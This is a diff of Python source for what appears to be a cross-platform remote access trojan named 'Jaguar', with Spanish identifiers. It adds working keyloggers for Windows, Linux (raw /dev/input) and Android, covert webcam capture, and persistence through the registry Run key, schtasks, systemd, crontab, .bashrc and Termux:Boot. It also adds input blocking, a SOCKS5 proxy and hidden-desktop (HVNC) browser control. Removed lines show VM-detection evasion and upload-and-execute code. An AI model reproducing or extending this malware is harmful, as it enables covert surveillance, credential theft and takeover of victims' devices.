+    return {"error": "instala xclip / wl-clipboard"}
+
+
+def _bloquear(a):
+    if ES_WIN:
+        import ctypes
+        _BLOQ["on"] = not _BLOQ["on"]
+        try:
+            ctypes.windll.user32.BlockInput(_BLOQ["on"])
+        except Exception:
+            pass
+        return {"bloqueado": _BLOQ["on"]}
+    if ES_ANDROID:
+        _root_cmd("input keyevent 26", timeout=12)
+        return {"bloqueado": True, "via": "keyevent power"}
+    if _tiene("xtrlock"):
+        try:
+            subprocess.Popen(["xtrlock"], **_sin_consola())
+        except Exception as e:
+            return {"error": str(e)}
+        return {"bloqueado": True, "via": "xtrlock"}
+    return {"error": "instala xtrlock"}
+
+
+def _mensaje(a):
+    txt = a.get("texto", "")
+    if ES_WIN:
+        import ctypes
+        threading.Thread(
+            target=lambda: ctypes.windll.user32.MessageBoxW(0, txt, "Jaguar", 0x40),
+            daemon=True).start()
         return {}
+    if ES_ANDROID:
+        ok, out = _tx("termux-toast", txt, timeout=15)
+        return {"ok": ok, "via": "termux-toast", "salida": out}
+    for cmd in (["zenity", "--info", "--text", txt],
+                ["notify-send", "Jaguar", txt],
+                ["xmessage", txt]):
+        if _tiene(cmd[0]):
+            try:
+                subprocess.Popen(cmd, **_sin_consola())
+                return {"via": cmd[0]}
+            except Exception:
+                continue
+    return {"error": "instala zenity o notify-send"}
+
+
+def _abrir_url(a):
+    url = a.get("url", "")
     try:
-        u.EmptyClipboard()
-        datos = (txt + "\x00").encode("utf-16-le")
-        h = k.GlobalAlloc(GMEM_MOVEABLE, len(datos))
-        p = k.GlobalLock(h)
-        ctypes.memmove(p, datos, len(datos))
-        k.GlobalUnlock(h)
-        u.SetClipboardData(CF_UNICODETEXT, h)
-    finally:
-        u.CloseClipboard()
-    return {"ok": True}
+        if ES_WIN:
+            os.startfile(url)
+        elif ES_ANDROID:
+            _root_cmd(f"am start -a android.intent.action.VIEW -d '{url}'", timeout=20)
+        elif ES_MAC:
+            subprocess.Popen(["open", url])
+        else:
+            subprocess.Popen(["xdg-open", url])
+    except Exception as e:
+        return {"error": str(e)}
+    return {}
 
 
+# ===========================================================================
+#  Webcam
+# ===========================================================================
 def _webcam(a):
+    if ES_ANDROID and _hay_termux_api():
+        idx = int(a.get("cam", 0))
+        destino = os.path.join(_HOME, ".jaguar_cam.jpg")
+        ok, txt = _tx("termux-camera-photo", "-c", str(idx), destino, timeout=40)
+        if not ok and not os.path.isfile(destino):
+            return {"b64": "", "error": txt or "termux-camera-photo fallo"}
+        try:
+            with open(destino, "rb") as f:
+                raw = f.read()
+            os.remove(destino)
+        except Exception as e:
+            return {"b64": "", "error": str(e)}
+        raw, w, h = _comprimir(raw, 0, 0, "jpeg", 75, 1.0)
+        return {"b64": base64.b64encode(raw).decode(), "w": w, "h": h}
     try:
         import cv2
         cap = cv2.VideoCapture(0)
@@ -491,7 +1107,8 @@ def _webcam_iniciar(a):
     if _WCAM["on"]:
         return {"estado": "ya activo"}
     _WCAM["on"] = True
-    threading.Thread(target=_wcam_loop, args=(int(a.get("cam", 0)),), daemon=True).start()
+    threading.Thread(target=_wcam_loop, args=(int(a.get("cam", 0)),),
+                     daemon=True).start()
     return {"estado": "iniciado"}
 
 
@@ -517,6 +1134,8 @@ def _wcam_loop(idx):
 
 
 def _webcam_frame(a):
+    if ES_ANDROID and _hay_termux_api():
+        return _webcam(a)
     return {"b64": base64.b64encode(_WCAM["frame"]).decode() if _WCAM["frame"] else "",
             "w": _WCAM["w"], "h": _WCAM["h"]}
 
@@ -526,17 +1145,19 @@ def _webcam_parar(a):
     return {"estado": "parado"}
 
 
-# ============================== KEYLOGGER ==================================
+# ===========================================================================
+#  Keylogger
+# ===========================================================================
 _VK_ESP = {0x20: " ", 0x0D: "\n", 0x08: "[BS]", 0x09: "[TAB]", 0x1B: "[ESC]",
            0x2E: "[DEL]", 0x21: "[PGUP]", 0x22: "[PGDN]", 0x23: "[END]",
-           0x24: "[HOME]", 0x25: "[<]", 0x26: "[^]", 0x27: "[>]", 0x28: "[v]",
-           0x14: "[CAPS]", 0x5B: "[WIN]"}
+           0x24: "[HOME]", 0x14: "[CAPS]", 0x5B: "[WIN]"}
 _VK_SHIFT = {0x31: "!", 0x32: "@", 0x33: "#", 0x34: "$", 0x35: "%", 0x36: "^",
              0x37: "&", 0x38: "*", 0x39: "(", 0x30: ")", 0xBD: "_", 0xBB: "+",
              0xBC: "<", 0xBE: ">", 0xBF: "?", 0xBA: ":", 0xDE: '"', 0xDB: "{",
-             0xDD: "}", 0xDC: "|", 0xC0: "~", 0xC1: "~"}
+             0xDD: "}", 0xDC: "|", 0xC0: "~"}
 _VK_PLAIN = {0xBD: "-", 0xBB: "=", 0xBC: ",", 0xBE: ".", 0xBF: "/", 0xBA: ";",
              0xDE: "'", 0xDB: "[", 0xDD: "]", 0xDC: "\\", 0xC0: "`"}
+_KLOG_HOOK = {"activo": False}
 
 
 def _vk_texto(vk):
@@ -550,8 +1171,7 @@ def _vk_texto(vk):
     except Exception:
         shift, caps = False, False
     if 65 <= vk <= 90:
-        letra = chr(vk) if (shift ^ caps) else chr(vk + 32)
-        return letra
+        return chr(vk) if (shift ^ caps) else chr(vk + 32)
     if 48 <= vk <= 57:
         return _VK_SHIFT.get(vk, chr(vk)) if shift else chr(vk)
     if vk in _VK_PLAIN:
@@ -563,22 +1183,122 @@ def _vk_texto(vk):
     return ""
 
 
-_KLOG_HOOK = {"activo": False}
+# ---- keylogger Linux: lectura directa de /dev/input (stdlib) ----
+_EV_KEY = 0x01
+_LINUX_MAP = {
+    1: "\x1b", 2: ("1", "!"), 3: ("2", "@"), 4: ("3", "#"), 5: ("4", "$"),
+    6: ("5", "%"), 7: ("6", "^"), 8: ("7", "&"), 9: ("8", "*"), 10: ("9", "("),
+    11: ("0", ")"), 12: ("-", "_"), 13: ("=", "+"), 14: "[BS]", 15: "[TAB]",
+    16: ("q", "Q"), 17: ("w", "W"), 18: ("e", "E"), 19: ("r", "R"),
+    20: ("t", "T"), 21: ("y", "Y"), 22: ("u", "U"), 23: ("i", "I"),
+    24: ("o", "O"), 25: ("p", "P"), 26: ("[", "{"), 27: ("]", "}"),
+    28: "\n", 29: "[CTRL]", 30: ("a", "A"), 31: ("s", "S"), 32: ("d", "D"),
+    33: ("f", "F"), 34: ("g", "G"), 35: ("h", "H"), 36: ("j", "J"),
+    37: ("k", "K"), 38: ("l", "L"), 39: (";", ":"), 40: ("'", '"'),
+    41: ("`", "~"), 42: "[LSHIFT]", 43: ("\\", "|"), 44: ("z", "Z"),
+    45: ("x", "X"), 46: ("c", "C"), 47: ("v", "V"), 48: ("b", "B"),
+    49: ("n", "N"), 50: ("m", "M"), 51: (",", "<"), 52: (".", ">"),
+    53: ("/", "?"), 54: "[RSHIFT]", 55: "*", 56: "[ALT]", 57: " ",
+    58: "[CAPS]", 59: "[F1]", 60: "[F2]", 61: "[F3]", 62: "[F4]", 63: "[F5]",
+    64: "[F6]", 65: "[F7]", 66: "[F8]", 67: "[F9]", 68: "[F10]", 87: "[F11]",
+    88: "[F12]", 96: "[ENTER]", 97: "[RCTRL]", 103: "[UP]", 105: "[LEFT]",
+    106: "[RIGHT]", 108: "[DOWN]", 110: "[INS]", 111: "[DEL]", 125: "[WIN]",
+}
+_LINUX_SHIFTS = (42, 54)
+_LINUX_LOCK = {"caps": False, "shift": False}
 
 
-def _keylogger_iniciar(a):
-    global _KLOG_ON
-    if _KLOG_ON:
-        return {"estado": "ya activo"}
-    _KLOG_ON = True
-    if _WIN:
-        threading.Thread(target=_klog_hook_loop, daemon=True).start()
-    threading.Thread(target=_klog_loop, daemon=True).start()
-    return {"estado": "iniciado"}
+def _klog_linux_loop():
+    import glob as _glob
+    for d in sorted(_glob.glob("/dev/input/event*")):
+        try:
+            fh = open(d, "rb", buffering=0)
+        except Exception:
+            continue
+        threading.Thread(target=_klog_evdev_hilo, args=(fh,), daemon=True).start()
+
+
+def _klog_evdev_hilo(fh):
+    while _KLOG_ON:
+        try:
+            datos = fh.read(24)
+        except Exception:
+            time.sleep(0.02)
+            continue
+        if not datos or len(datos) < 24:
+            continue
+        try:
+            _s, _u, tipo, codigo, valor = struct.unpack("llHHi", datos)
+        except Exception:
+            continue
+        if tipo != _EV_KEY or valor != 1:
+            continue
+        if codigo in _LINUX_SHIFTS:
+            _LINUX_LOCK["shift"] = True
+            continue
+        if codigo == 58:
+            _LINUX_LOCK["caps"] = not _LINUX_LOCK["caps"]
+            continue
+        entrada = _LINUX_MAP.get(codigo)
+        if entrada is None:
+            continue
+        if isinstance(entrada, tuple):
+            txt = entrada[1] if (_LINUX_LOCK["shift"] ^ _LINUX_LOCK["caps"]) else entrada[0]
+        else:
+            txt = entrada
+        if txt:
+            _KLOG.append(txt)
+            if len(_KLOG) > 40000:
+                del _KLOG[:-20000]
+
+
+# ---- keylogger Android: getevent -lt ----
+_ANDROID_KEY = {
+    "KEY_A": "a", "KEY_B": "b", "KEY_C": "c", "KEY_D": "d", "KEY_E": "e",
+    "KEY_F": "f", "KEY_G": "g", "KEY_H": "h", "KEY_I": "i", "KEY_J": "j",
+    "KEY_K": "k", "KEY_L": "l", "KEY_M": "m", "KEY_N": "n", "KEY_O": "o",
+    "KEY_P": "p", "KEY_Q": "q", "KEY_R": "r", "KEY_S": "s", "KEY_T": "t",
+    "KEY_U": "u", "KEY_V": "v", "KEY_W": "w", "KEY_X": "x", "KEY_Y": "y",
+    "KEY_Z": "z", "KEY_0": "0", "KEY_1": "1", "KEY_2": "2", "KEY_3": "3",
+    "KEY_4": "4", "KEY_5": "5", "KEY_6": "6", "KEY_7": "7", "KEY_8": "8",
+    "KEY_9": "9", "KEY_SPACE": " ", "KEY_ENTER": "\n", "KEY_BACKSPACE": "[BS]",
+    "KEY_TAB": "[TAB]", "KEY_DOT": ".", "KEY_COMMA": ",", "KEY_MINUS": "-",
+    "KEY_APOSTROPHE": "'", "KEY_SLASH": "/", "KEY_AT": "@", "KEY_SEMICOLON": ";",
+    "KEY_EQUAL": "=", "KEY_LEFTBRACE": "[", "KEY_RIGHTBRACE": "]",
+    "KEY_BACKSLASH": "\\", "KEY_GRAVE": "`", "KEY_LEFTSHIFT": "[LSHIFT]",
+    "KEY_RIGHTSHIFT": "[RSHIFT]", "KEY_CAPSLOCK": "[CAPS]",
+    "KEY_DEL": "[DEL]", "KEY_FORWARD_DEL": "[DEL]",
+}
+_klog_android_proc = {"p": None}
+
+
+def _klog_android_loop():
+    try:
+        p = subprocess.Popen(["getevent", "-lt"], stdout=subprocess.PIPE,
+                             stderr=subprocess.STDOUT, text=True, errors="replace")
+        _klog_android_proc["p"] = p
+    except Exception:
+        return
+    patron = re.compile(r"EV_KEY\s+(\S+)\s+(DOWN|UP)")
+    while _KLOG_ON:
+        try:
+            ln = p.stdout.readline()
+        except Exception:
+            break
+        if not ln:
+            time.sleep(0.05)
+            continue
+        m = patron.search(ln)
+        if not m or m.group(2) != "DOWN":
+            continue
+        txt = _ANDROID_KEY.get(m.group(1))
+        if txt and not txt.startswith("["):
+            _KLOG.append(txt)
+            if len(_KLOG) > 40000:
+                del _KLOG[:-20000]
 
 
 def _klog_hook_loop():
-    """Hook de bajo nivel WH_KEYBOARD_LL (silencioso, capta teclas fisicas)."""
     import ctypes
     from ctypes import wintypes
     u = ctypes.windll.user32
@@ -627,116 +1347,143 @@ def _klog_hook_loop():
     _KLOG_HOOK["activo"] = False
 
 
-def _klog_loop():
-    """Respaldo por sondeo si el hook no esta activo."""
-    if not _WIN:
-        return
-    import ctypes
-    u = ctypes.windll.user32
-    while _KLOG_ON:
-        if not _KLOG_HOOK["activo"]:
-            for vk in range(8, 256):
-                if u.GetAsyncKeyState(vk) & 1:
-                    txt = _vk_texto(vk)
-                    if txt:
-                        _KLOG.append(txt)
-        time.sleep(0.02)
+def _keylogger_iniciar(a):
+    global _KLOG_ON
+    if _KLOG_ON:
+        return {"estado": "ya activo"}
+    _KLOG_ON = True
+    if ES_WIN:
+        threading.Thread(target=_klog_hook_loop, daemon=True).start()
+    elif ES_ANDROID:
+        if not _tiene("getevent"):
+            return {"error": "getevent no disponible", "estado": "iniciado"}
+        threading.Thread(target=_klog_android_loop, daemon=True).start()
+    else:
+        threading.Thread(target=_klog_linux_loop, daemon=True).start()
+    return {"estado": "iniciado", "so": SO}
 
 
 def _keylogger_leer(a):
     global _KLOG
     txt = "".join(_KLOG)
     _KLOG = []
-    return {"texto": txt, "hook": _KLOG_HOOK["activo"]}
+    return {"texto": txt, "hook": _KLOG_HOOK["activo"] or ES_LINUX or ES_ANDROID}
 
 
-def _es_vm():
-    try:
-        r = subprocess.run(["wmic", "computersystem", "get", "model,manufacturer"],
-                           capture_output=True, text=True, **_sin_consola())
-        t = (r.stdout or "").lower()
-        return any(k in t for k in ("vmware", "virtualbox", "vbox", "qemu",
-                                    "xen", "kvm", "hyper-v", "virtual machine"))
-    except Exception:
-        return False
+# ===========================================================================
+#  Persistencia
+# ===========================================================================
+def _exe_actual():
+    if getattr(sys, "frozen", False):
+        return sys.executable
+    return os.path.abspath(sys.argv[0])
 
 
-def _persistir_avanzado(a=None):
-    """Persistencia doble: HKCU\\Run + tarea programada ONLOGON (estilo PureRAT)."""
-    exe = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(sys.argv[0])
+def _persistir(a=None):
+    exe = _exe_actual()
+    hecho = []
 
-    # 1) Registro (solo Windows)
-    try:
-        import winreg as _wr
-    except ImportError:
-        _wr = None
-    if _wr:
+    if ES_ANDROID:
         try:
+            boot = os.path.join(_HOME, ".termux", "boot")
+            os.makedirs(boot, exist_ok=True)
+            script = os.path.join(boot, "jaguar.sh")
+            py = shutil.which("python") or "python"
+            with open(script, "w", encoding="utf-8") as f:
+                f.write("#!/data/data/com.termux/files/usr/bin/sh\n"
+                        "termux-wake-lock 2>/dev/null\n"
+                        f'nohup {py} "{exe}" >/dev/null 2>&1 &\n')
+            os.chmod(script, 0o755)
+            hecho.append("Termux:Boot")
+        except Exception:
+            pass
+        try:
+            rc = os.path.join(_HOME, ".bashrc")
+            with open(rc, "a", encoding="utf-8") as f:
+                f.write(f'\n# jaguar-agent\npython "{exe}" >/dev/null 2>&1 &\n')
+            hecho.append(".bashrc")
+        except Exception:
+            pass
+        return {"ok": True, "exe": exe, "vias": hecho,
+                "nota": "instala la app Termux:Boot y abrela una vez"}
+
+    if ES_WIN:
+        try:
+            import winreg as _wr
             k = _wr.OpenKey(_wr.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, _wr.KEY_SET_VALUE)
             _wr.SetValueEx(k, NOMBRE, 0, _wr.REG_SZ, exe)
             _wr.CloseKey(k)
+            hecho.append("HKCU\\Run")
         except Exception:
             pass
-
-    # 2) Tarea programada (solo Windows; sobrevive a limpiezas de Run)
-    if _WIN:
         try:
             subprocess.run(["schtasks", "/create", "/tn", NOMBRE, "/tr", f'"{exe}"',
                             "/sc", "ONLOGON", "/rl", "HIGHEST", "/f"],
                            capture_output=True, text=True, **_sin_consola())
+            hecho.append("schtasks")
         except Exception:
             pass
+        return {"ok": True, "exe": exe, "vias": hecho}
 
-    return {"ok": True, "exe": exe}
-
-
-def _abrir_url(a):
+    if _tiene("systemctl"):
+        try:
+            carpeta = os.path.join(_HOME, ".config", "systemd", "user")
+            os.makedirs(carpeta, exist_ok=True)
+            unidad = os.path.join(carpeta, "jaguar.service")
+            linea = (f'"{sys.executable}" "{exe}"'
+                     if not getattr(sys, "frozen", False) else f'"{exe}"')
+            with open(unidad, "w", encoding="utf-8") as f:
+                f.write("[Unit]\nDescription=Jaguar\n\n"
+                        "[Service]\nType=simple\n"
+                        f"ExecStart={linea}\nRestart=always\nRestartSec=5\n\n"
+                        "[Install]\nWantedBy=default.target\n")
+            subprocess.run(["systemctl", "--user", "daemon-reload"],
+                           capture_output=True, timeout=15)
+            subprocess.run(["systemctl", "--user", "enable", "--now",
+                            "jaguar.service"], capture_output=True, timeout=15)
+            hecho.append("systemd --user")
+        except Exception:
+            pass
+    if _tiene("crontab"):
+        try:
+            r = subprocess.run(["crontab", "-l"], capture_output=True, text=True,
+                               timeout=10)
+            actual = r.stdout or ""
+            if "jaguar" not in actual:
+                linea = f"@reboot {sys.executable} {exe} >/dev/null 2>&1"
+                nuevo = actual.rstrip() + "\n# jaguar\n" + linea + "\n"
+                p = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
+                p.communicate(nuevo)
+                hecho.append("crontab @reboot")
+        except Exception:
+            pass
     try:
-        if _WIN:
-            os.startfile(a.get("url", ""))
-        else:
-            subprocess.Popen(["xdg-open", a.get("url", "")])
+        rc = os.path.join(_HOME, ".bashrc")
+        if os.path.isfile(rc):
+            with open(rc, encoding="utf-8", errors="replace") as f:
+                contenido = f.read()
+            if "# jaguar-agent" not in contenido:
+                with open(rc, "a", encoding="utf-8") as f:
+                    f.write(f'\n# jaguar-agent\n{shutil.which("python3") or "python3"} '
+                            f'"{exe}" >/dev/null 2>&1 &\n')
+                hecho.append(".bashrc")
     except Exception:
         pass
-    return {}
+    return {"ok": True, "exe": exe, "vias": hecho}
 
 
-def _mensaje(a):
-    if _WIN:
-        import ctypes
-        txt = a.get("texto", "")
-        threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, txt, "Jaguar", 0x40),
-                         daemon=True).start()
-    return {}
-
-
-def _descargar(a):
-    with open(a.get("ruta", ""), "rb") as f:
-        d = f.read()
-    return {"nombre": os.path.basename(a.get("ruta", "")),
-            "b64": base64.b64encode(d).decode(), "tamano": len(d)}
-
-
-def _subir_ejecutar(a):
-    d = base64.b64decode(a.get("b64", ""))
-    ruta = os.path.join(tempfile.gettempdir(), a.get("nombre", "archivo.bin"))
-    with open(ruta, "wb") as f:
-        f.write(d)
-    try:
-        subprocess.Popen([ruta], shell=True, **_sin_consola())
-    except Exception:
-        pass
-    return {"ruta": ruta}
-
-
+# ===========================================================================
+#  Proxy SOCKS5 (portable)
+# ===========================================================================
 def _proxy_iniciar(a):
     global _PROXY_ON
     if _PROXY_ON:
         return {"estado": "ya activo"}
     _PROXY_ON = True
-    threading.Thread(target=_socks_loop, args=(int(a.get("puerto", 1080)),), daemon=True).start()
+    threading.Thread(target=_socks_loop, args=(int(a.get("puerto", 1080)),),
+                     daemon=True).start()
     return {"estado": "proxy SOCKS5 activo"}
 
 
@@ -806,8 +1553,10 @@ def _desconectar(a):
     return {"estado": "adios"}
 
 
-# ================================== HVNC ====================================
-if _WIN:
+# ===========================================================================
+#  HVNC — Windows: desktop oculto | Linux: perfil aislado + ventana
+# ===========================================================================
+if ES_WIN:
     import ctypes
     from ctypes import wintypes
     try:
@@ -881,62 +1630,17 @@ if _WIN:
                     ("rcCaret", _RECT)]
 
     _u32.CreateDesktopW.restype = wintypes.HANDLE
-    _u32.CreateDesktopW.argtypes = [wintypes.LPCWSTR, wintypes.LPCWSTR, ctypes.c_void_p,
-                                    wintypes.DWORD, wintypes.DWORD, ctypes.c_void_p]
     _u32.OpenDesktopW.restype = wintypes.HANDLE
-    _u32.OpenDesktopW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.BOOL,
-                                  wintypes.DWORD]
-    _u32.CloseDesktop.argtypes = [wintypes.HANDLE]
-    _u32.SetThreadDesktop.argtypes = [wintypes.HANDLE]
     _u32.SetThreadDesktop.restype = wintypes.BOOL
-    _u32.EnumDesktopWindows.argtypes = [wintypes.HANDLE, ctypes.c_void_p, wintypes.LPARAM]
-    _u32.EnumChildWindows.argtypes = [wintypes.HWND, ctypes.c_void_p, wintypes.LPARAM]
-    _u32.GetWindowRect.argtypes = [wintypes.HWND, ctypes.POINTER(_RECT)]
-    _u32.GetClassNameW.argtypes = [wintypes.HWND, wintypes.LPWSTR, ctypes.c_int]
-    _u32.GetWindowDC.argtypes = [wintypes.HWND]
     _u32.GetWindowDC.restype = wintypes.HDC
-    _u32.ReleaseDC.argtypes = [wintypes.HWND, wintypes.HDC]
-    _u32.PrintWindow.argtypes = [wintypes.HWND, wintypes.HDC, wintypes.UINT]
-    _u32.ScreenToClient.argtypes = [wintypes.HWND, ctypes.POINTER(_POINT)]
-    _u32.ClientToScreen.argtypes = [wintypes.HWND, ctypes.POINTER(_POINT)]
-    _u32.PostMessageW.argtypes = [wintypes.HWND, wintypes.UINT, wintypes.WPARAM, wintypes.LPARAM]
-    _u32.MapVirtualKeyW.argtypes = [wintypes.UINT, wintypes.UINT]
-    _u32.ChildWindowFromPointEx.argtypes = [wintypes.HWND, _POINT, wintypes.UINT]
     _u32.ChildWindowFromPointEx.restype = wintypes.HWND
-    _u32.MapWindowPoints.argtypes = [wintypes.HWND, wintypes.HWND,
-                                     ctypes.POINTER(_POINT), wintypes.UINT]
-    _u32.GetGUIThreadInfo.argtypes = [wintypes.DWORD, ctypes.c_void_p]
-    _u32.GetWindowThreadProcessId.argtypes = [wintypes.HWND, ctypes.POINTER(wintypes.DWORD)]
     _u32.GetWindowThreadProcessId.restype = wintypes.DWORD
-    _k32.CreateProcessW.argtypes = [wintypes.LPCWSTR, wintypes.LPWSTR, ctypes.c_void_p,
-                                    ctypes.c_void_p, wintypes.BOOL, wintypes.DWORD,
-                                    ctypes.c_void_p, wintypes.LPCWSTR,
-                                    ctypes.POINTER(_STARTUPINFOW),
-                                    ctypes.POINTER(_PROCESS_INFORMATION)]
-    _k32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
-    _k32.GetExitCodeProcess.argtypes = [wintypes.HANDLE, ctypes.POINTER(wintypes.DWORD)]
-    _k32.GlobalAlloc.argtypes = [wintypes.UINT, ctypes.c_size_t]
     _k32.GlobalAlloc.restype = ctypes.c_void_p
-    _k32.GlobalLock.argtypes = [ctypes.c_void_p]
     _k32.GlobalLock.restype = ctypes.c_void_p
-    _g32.CreateCompatibleDC.argtypes = [wintypes.HDC]
     _g32.CreateCompatibleDC.restype = wintypes.HDC
-    _g32.CreateCompatibleBitmap.argtypes = [wintypes.HDC, ctypes.c_int, ctypes.c_int]
     _g32.CreateCompatibleBitmap.restype = wintypes.HBITMAP
-    _g32.SelectObject.argtypes = [wintypes.HDC, wintypes.HGDIOBJ]
-    _g32.GetDIBits.argtypes = [wintypes.HDC, wintypes.HBITMAP, wintypes.UINT, wintypes.UINT,
-                               ctypes.c_void_p, ctypes.POINTER(_BITMAPINFO), wintypes.UINT]
-    _g32.DeleteObject.argtypes = [wintypes.HGDIOBJ]
-    _g32.DeleteDC.argtypes = [wintypes.HDC]
-    _u32.SetClipboardData.argtypes = [wintypes.UINT, ctypes.c_void_p]
-    _advapi32.InitializeSecurityDescriptor.argtypes = [ctypes.c_void_p, wintypes.DWORD]
-    _advapi32.SetSecurityDescriptorDacl.argtypes = [ctypes.c_void_p, wintypes.BOOL,
-                                                    ctypes.c_void_p, wintypes.BOOL]
-
     _ENUMPROC = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
 
-# Un unico --disable-features (evita que Chrome descarte los anteriores) con todo
-# lo necesario para que Chrome/Edge/Brave PINTEN en un escritorio oculto.
 _FLAGS_CHROMIUM = (
     "--no-sandbox --disable-gpu-sandbox --disable-gpu --disable-gpu-compositing "
     "--disable-direct-composition --disable-software-rasterizer "
@@ -952,12 +1656,90 @@ _FLAGS_CHROMIUM = (
 _HVNC = {"pid": None, "hwnd": None, "rw": None, "hdesk": None, "navegador": None,
          "exe": None, "error": None, "estado": "idle", "perfil": None, "hash": None,
          "_sd": None, "activado": False}
-
 _HVNC_CFG = {"calidad": 55, "escala": 0.75, "fps": 10}
-
 _GDI = {"w": 0, "h": 0, "mdc": 0, "bmp": 0, "viejo": 0, "buf": None}
+_HVNC_PIDS = []
 
 
+def _ruta_navegador(nav):
+    nav = (nav or "chrome").lower()
+    alias = {
+        "chrome": ["google-chrome", "chrome", "chromium", "chromium-browser"],
+        "google-chrome": ["google-chrome", "chrome"],
+        "edge": ["microsoft-edge", "msedge"],
+        "msedge": ["microsoft-edge", "msedge"],
+        "brave": ["brave-browser", "brave"],
+        "opera": ["opera"],
+        "firefox": ["firefox"],
+    }.get(nav, [nav])
+
+    if ES_WIN:
+        try:
+            import winreg
+            for exe in [a + ".exe" for a in alias]:
+                for raiz in (winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER):
+                    try:
+                        k = winreg.OpenKey(raiz, r"SOFTWARE\Microsoft\Windows"
+                                                 r"\CurrentVersion\App Paths\\" + exe)
+                        ruta = winreg.QueryValueEx(k, "")[0]
+                        winreg.CloseKey(k)
+                        if ruta and os.path.isfile(ruta):
+                            return ruta
+                    except Exception:
+                        pass
+        except Exception:
+            pass
+        cands = []
+        if nav in ("chrome", "google-chrome"):
+            cands = [r"%ProgramFiles%\Google\Chrome\Application\chrome.exe",
+                     r"%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe",
+                     r"%LocalAppData%\Google\Chrome\Application\chrome.exe"]
+        elif nav in ("edge", "msedge"):
+            cands = [r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe",
+                     r"%ProgramFiles%\Microsoft\Edge\Application\msedge.exe"]
+        elif nav == "brave":
+            cands = [r"%ProgramFiles%\BraveSoftware\Brave-Browser\Application\brave.exe",
+                     r"%LocalAppData%\BraveSoftware\Brave-Browser\Application\brave.exe"]
+        elif nav == "firefox":
+            cands = [r"%ProgramFiles%\Mozilla Firefox\firefox.exe",
+                     r"%ProgramFiles(x86)%\Mozilla Firefox\firefox.exe"]
+        for c in cands:
+            p = os.path.expandvars(c)
+            if p and os.path.isfile(p):
+                return p
+
+    for a in alias:
+        r = shutil.which(a)
+        if r:
+            return r
+    for c in ("/usr/bin/google-chrome", "/usr/bin/chromium",
+              "/usr/bin/chromium-browser", "/usr/bin/brave-browser",
+              "/usr/bin/microsoft-edge", "/usr/bin/firefox"):
+        if os.path.isfile(c):
+            return c
+    return None
+
+
+def _hvnc_iniciar(a):
+    nav = (a.get("navegador") or "chrome").lower()
+    _HVNC.update({"hwnd": None, "rw": None, "navegador": nav, "error": None,
+                  "hash": None, "estado": "arrancando", "activado": False})
+    _HVNC["exe"] = _ruta_navegador(nav)
+    if not _HVNC["exe"]:
+        _HVNC["estado"] = "error"
+        _HVNC["error"] = f"navegador no encontrado: {nav}"
+        return {"error": _HVNC["error"]}
+    _log("HVNC", f"iniciar nav={nav} exe={_HVNC['exe']} so={SO}")
+    if ES_WIN:
+        threading.Thread(target=_hvnc_trabajo_win, args=(a,), daemon=True).start()
+    elif ES_ANDROID:
+        threading.Thread(target=_hvnc_trabajo_linux, args=(a,), daemon=True).start()
+    else:
+        threading.Thread(target=_hvnc_trabajo_linux, args=(a,), daemon=True).start()
+    return {"estado": "arrancando", "navegador": nav, "exe": _HVNC["exe"], "so": SO}
+
+
+# ------------------------------- HVNC Windows ------------------------------
 def _sec_dacl_null():
     sd = _SECURITY_DESCRIPTOR()
     _advapi32.InitializeSecurityDescriptor(ctypes.byref(sd), 1)
@@ -969,60 +1751,6 @@ def _sec_dacl_null():
     return sa, sd
 
 
-def _ruta_navegador(nav):
-    nav = (nav or "chrome").lower()
-    alias = {
-        "chrome": ["chrome.exe"], "google-chrome": ["chrome.exe"],
-        "edge": ["msedge.exe"], "msedge": ["msedge.exe"],
-        "brave": ["brave.exe"], "opera": ["opera.exe", "launcher.exe"],
-        "firefox": ["firefox.exe"],
-    }.get(nav, [nav + ".exe"])
-
-    try:
-        import winreg
-        for exe in alias:
-            for raiz in (winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER):
-                try:
-                    k = winreg.OpenKey(raiz, r"SOFTWARE\Microsoft\Windows"
-                                             r"\CurrentVersion\App Paths\\" + exe)
-                    ruta = winreg.QueryValueEx(k, "")[0]
-                    winreg.CloseKey(k)
-                    if ruta and os.path.isfile(ruta):
-                        return ruta
-                except Exception:
-                    pass
-    except Exception:
-        pass
-
-    for exe in alias:
-        r = shutil.which(exe)
-        if r:
-            return r
-
-    cands = []
-    if nav in ("chrome", "google-chrome"):
-        cands = [r"%ProgramFiles%\Google\Chrome\Application\chrome.exe",
-                 r"%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe",
-                 r"%LocalAppData%\Google\Chrome\Application\chrome.exe"]
-    elif nav in ("edge", "msedge"):
-        cands = [r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe",
-                 r"%ProgramFiles%\Microsoft\Edge\Application\msedge.exe"]
-    elif nav == "brave":
-        cands = [r"%ProgramFiles%\BraveSoftware\Brave-Browser\Application\brave.exe",
-                 r"%LocalAppData%\BraveSoftware\Brave-Browser\Application\brave.exe"]
-    elif nav == "opera":
-        cands = [r"%LocalAppData%\Programs\Opera\opera.exe",
-                 r"%ProgramFiles%\Opera\opera.exe"]
-    elif nav == "firefox":
-        cands = [r"%ProgramFiles%\Mozilla Firefox\firefox.exe",
-                 r"%ProgramFiles(x86)%\Mozilla Firefox\firefox.exe"]
-    for c in cands:
-        p = os.path.expandvars(c)
-        if p and os.path.isfile(p):
-            return p
-    return None
-
-
 def _hvnc_crear_desktop():
     if _HVNC.get("hdesk"):
         return _HVNC["hdesk"]
@@ -1032,8 +1760,6 @@ def _hvnc_crear_desktop():
         h = _u32.CreateDesktopW(DESKTOP_NAME, None, None, 0, DESKTOP_ACCESS,
                                 ctypes.byref(sa))
         _HVNC["_sd"] = sd
-        if not h:
-            _log("HVNC", f"CreateDesktopW fallo err={ctypes.GetLastError()}")
     _HVNC["hdesk"] = h
     return h
 
@@ -1058,20 +1784,40 @@ def _hvnc_crear(exe, linea, desktop):
     return pid, hproc
 
 
-_HVNC_PIDS = []
-
-def _hvnc_lanzar(nav, url=None):
-    ...
